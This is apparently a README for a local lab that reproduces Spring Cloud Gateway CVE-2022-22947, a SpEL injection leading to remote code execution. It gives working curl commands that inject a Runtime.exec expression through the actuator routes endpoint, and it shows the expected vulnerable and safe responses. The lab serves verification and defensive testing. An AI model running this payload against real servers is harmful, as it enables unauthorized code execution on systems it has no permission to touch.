# Spring Cloud Gateway CVE-2022-22947

This folder contains source code and a Docker Compose setup for Spring Cloud Gateway's CVE-2022-22947, which is a SpEL injection on an unauthenticated endpoint, leading to RCE.

To run it, use `docker compose up`, which will expose the vulnerable service on port 8081 and the safe service on port 8082.

## Confirming the Vulnerability

To test the vulnerability, run the following commands:

1. Create route
```
curl -v -X POST "http://localhost:8081/actuator/gateway/routes/133713371337" \
-H "Content-Type: application/json" \
-d '{
  "id": "133713371337",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result=",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"printf %x 133713371337\").getInputStream()))}"
    }
  }],
  "uri": "http://localhost"
}'
```
2. Refresh routes
```
curl -X POST http://localhost:8081/actuator/gateway/refresh
```

3. Verify the response
```
curl -v http://localhost:8081/actuator/gateway/routes/133713371337
```

### Vulnerable Response
{"predicate":"RouteDefinitionRouteLocator$$Lambda$1012/0x000000084062f440","route_id":"133713371337","filters":["[[AddResponseHeader Result= = '**1f21f020c9**'], order = 1]"],"uri":"http://localhost:80","order":0}

### Non-Vulnerable Response
404, spel evaluation fails.